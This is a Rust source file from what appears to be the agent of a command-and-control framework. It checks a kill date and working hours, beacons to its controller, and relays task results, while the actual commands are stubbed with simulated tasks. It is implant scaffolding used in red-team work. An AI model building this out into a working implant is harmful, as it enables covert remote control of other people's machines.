use alloc::sync::Arc;
use std::collections::BTreeMap;
#[cfg(feature = "std-runtime")]
use std::sync::mpsc;
#[cfg(feature = "std-runtime")]
use std::thread::{self, JoinHandle};

use kageshirei_communication_protocol::{
    communication::{AgentCommands, SimpleAgentCommand, TaskOutput},
    error::Format as FormatError,
    Format,
    Metadata,
    Protocol,
};
use kageshirei_runtime::Runtime;
use libc_print::libc_println;
use mod_agentcore::instance;
#[cfg(feature = "nostd-nt-runtime")]
use mod_nostd::{nostd_mpsc, nostd_thread};
use mod_win32::nt_time::{check_kill_date, is_working_hours, wait_until};

use super::system::command_exit;
use crate::{
    command::{filesystem::command_pwd, system::command_checkin},
    common::utils::{generate_path, generate_request_id},
    setup::communication::{encryptor_from_raw, formatter_from_raw, protocol_from_raw},
};
pub fn command_handler<R>(rt: Arc<R>)
where
    R: Runtime + 'static,
{
    unsafe {
        // Check if the session is connected, return early if it's not.
        if !instance().session.connected {
            return;
        }

        // Check if the configured kill date has been reached. If so, exit the command.
        if check_kill_date(instance().config.kill_date) {
            command_exit(0);
        }

        // Verify if the current time is within the allowed working hours. If not, return early.
        if !is_working_hours(&instance().config.working_hours) {
            return;
        }

        // Set up channels for sending and receiving `TaskOutput` results. This section differs based
        // on whether the `std-runtime` or `nostd-nt-runtime` feature is enabled.

        // For the `std-runtime` feature:
        #[cfg(feature = "std-runtime")]
        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(); // Standard channel for task output communication.

        #[cfg(feature = "std-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx); // Spawn the result handler thread.

        // For the `nostd-nt-runtime` feature:
        #[cfg(feature = "nostd-nt-runtime")]
        let (result_tx, result_rx) = nostd_mpsc::channel::<TaskOutput>(); // No-Std compatible channel.

        #[cfg(feature = "nostd-nt-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx); // Spawn the result handler thread.

        #[cfg(any(feature = "protocol-json", feature = "proto-http-winhttp"))]
        {
            // Retrieve the encryptor and protocol objects from the session.
            // let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);
            let formatter = formatter_from_raw(instance().session.formatter_ptr);
            // let protocol_write = protocol_from_raw(instance().session.protocol_ptr);

            // Generate a unique path and request ID for the current task.
            let (_, path, request_id) = generate_path(32, 0, 6);

            // Prepare a new `TaskOutput` object to store metadata and task details.
            let mut data = TaskOutput::new();

            // Create the metadata object, which contains request ID, command ID, and agent ID.
            let metadata = Arc::new(Metadata {
                request_id,
                command_id: generate_request_id(32),
                agent_id: instance().config.id.clone(),
                path: Some(path),
            });

            // data.with_metadata(metadata);

            match formatter.write(data.clone(), None::<BTreeMap<&str, &str>>) {
                Ok(data) => {
                    // Use the async runtime to send the `TaskOutput` through the protocol. The write operation is
                    // performed asynchronously, and the result is awaited within a block.
                    let result = rt.block_on(async { protocol.send(data, Some(metadata)).await });

                    if result.is_ok() {
                        // Read the list of commands from the protocol
                        // let tasks_response: Result<Vec<SimpleAgentCommand>, String> =
                        //     protocol.read(result.unwrap(), None);

                        // let tasks_response: Result<Vec<SimpleAgentCommand>, FormatError> =
                        //     formatter.read(result.unwrap().as_slice(), None::<BTreeMap<&str, &str>>);

                        // match tasks_response {
                        //     Ok(tasks) => {
                        //         // Iterate over each task in the list of commands
                        //         for command in tasks {
                        //             let result_tx = result_tx.clone();
                        //             let runtime_clone = Arc::clone(&rt);

                        //             // Spawn a new task to handle each command concurrently
                        //             runtime_clone.spawn(move || {
                        //                 let result = match command.op {
                        //                     AgentCommands::Terminate => command_exit(0),
                        //                     AgentCommands::Checkin =>
                        // command_checkin(command.metadata),
                        // AgentCommands::INVALID => TaskOutput::new(),
                        //                 };

                        //                 // Send the result back through the result_tx channel
                        //                 result_tx.send(result).unwrap();
                        //             });
                        //         }
                        //     },
                        //     Err(e) => {
                        //         // Handle error when reading tasks from protocol
                        //         eprintln!("Failed to read tasks: {:?}", e);
                        //     },
                        // }

                        for i in 0 .. 10 {
                            // Generate metadata for each task
                            let metadata = Metadata {
                                request_id: format!("req-{}", i),
                                command_id: format!("cmd-{}", i),
                                agent_id:   "agent-1234".to_string(),
                                path:       None,
                            };

                            let command = if i % 2 == 0 {
                                SimpleAgentCommand {
                                    op: AgentCommands::INVALID,
                                    metadata,
                                }
                            }
                            else {
                                SimpleAgentCommand {
                                    op: AgentCommands::Checkin,
                                    metadata,
                                }
                            };

                            let result_tx = result_tx.clone();

                            let runtime_clone = Arc::clone(&rt);
                            runtime_clone.spawn(move || {
                                let result = match command.op {
                                    AgentCommands::Terminate => task_type_a(command.metadata),
                                    AgentCommands::Checkin => task_type_a(command.metadata),
                                    AgentCommands::INVALID => task_type_b(command.metadata),
                                };
                                result_tx.send(result).unwrap();
                            });
                        }
                    }
                },
                Err(e) => {
                    // Handle error when writing tasks to protocol
                    eprintln!("Failed to format data: ");
                },
            }
        }

        #[cfg(feature = "std-runtime")]
        rt.block_on(async {
            drop(result_tx); // Close the result channel, indicating no more tasks will send results.
            result_handler_handle.join().unwrap(); // Wait for the result handler to finish
                                                   // processing all results.
        });

        #[cfg(feature = "nostd-nt-runtime")]
        drop(result_tx); // Close the result channel, indicating no more tasks will send results.
        #[cfg(feature = "nostd-nt-runtime")]
        result_handler_handle.join().unwrap(); // Wait for the result handler to finish processing
                                               // all results.
    }
}

#[cfg(feature = "std-runtime")]
pub fn result_handler<R>(rt: Arc<R>, result_rx: mpsc::Receiver<TaskOutput>) -> JoinHandle<()>
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.
    thread::spawn(move || {
        while let Ok(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            // Block on the async write operation using the runtime's block_on method
            rt.block_on(async move {
                protocol
                    .write(result.clone(), Some(encryptor.clone()))
                    .await
                    .unwrap();
            });
        }
    })
}

#[cfg(feature = "nostd-nt-runtime")]
pub fn result_handler<R>(rt: Arc<R>, result_rx: nostd_mpsc::Receiver<TaskOutput>) -> nostd_thread::NoStdThread
where
    R: Runtime,
{
    // Spawn a separate thread to handle and process the results.

    nostd_thread::NoStdThread::spawn(move || {
        while let Some(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let formatter = unsafe { formatter_from_raw(instance().session.formatter_ptr) };
            // let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            let formatted_data = formatter.write(result.clone(), None::<BTreeMap<&str, &str>>);

            match formatted_data {
                Ok(data) => {
                    // Block on the async write operation using the runtime's block_on method
                    rt.block_on(async move {
                        protocol.send(data, None).await;
                    });
                },
                Err(_) => {},
            }

            // // Block on the async write operation using the runtime's block_on method
            // rt.block_on(async move {
            //     protocol.send(formatted_data, None).await;
            // });
        }
    })
    .expect("Failed to spawn result handler thread")
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 2 seconds to complete.
pub fn task_type_a(metadata: Metadata) -> TaskOutput {
    wait_until(1);
    let mut output = TaskOutput::new();
    output.output = Some("Result from task type A".to_string());
    output
}

// #[cfg(feature = "std-runtime")]
// Simulated task that takes 3 seconds to complete.
pub fn task_type_b(metadata: Metadata) -> TaskOutput {
    wait_until(3);
    let mut output = TaskOutput::new();
    output.output = Some("Result from task type B".to_string());
    output
}
